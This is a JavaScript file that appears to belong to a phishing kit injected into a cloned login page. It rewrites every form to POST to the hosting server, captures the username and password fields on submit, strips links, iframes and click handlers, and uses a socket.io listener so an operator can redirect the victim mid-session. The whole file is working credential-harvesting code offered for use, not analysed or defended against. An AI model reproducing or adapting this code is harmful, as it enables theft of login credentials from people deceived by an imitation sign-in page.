const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[id="username"]`,
            `[id="password"]`
        ],
        runner() {
            [
                `[id="username"]`,
                `[id="password"]`
            ].forEach(inp => {
                const input = document.querySelector(inp)

                input.addEventListener("input", () => {
                    if (input.value.length > 0) {
                        input.previousElementSibling.classList.add("ux-label--floating")
                    } else {
                        input.previousElementSibling.classList.remove("ux-label--floating")
                    }
                })
            });

            const email = document.querySelector(`[id="username"]`)
            const password = document.querySelector(`[id="password"]`);
            const submitBtn = document.querySelector("#submitBtn")

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    username: email.value,
                    password: password.value
                })
            })
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    // {
    //     spikeType: "",
    //     runner() {

    //     }
    // }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{
    const showPassword = document.querySelector(`[aria-label="Show password"]`)
    if (showPassword) {
        const password = document.querySelector("#password")
        showPassword.addEventListener("click", () => {
            if (password.type == "password") {
                password.type = "text"
                showPassword.innerText = "Hide"
            } else {
                password.type = "password"
                showPassword.innerText = "Show"
            }
        })
    }
}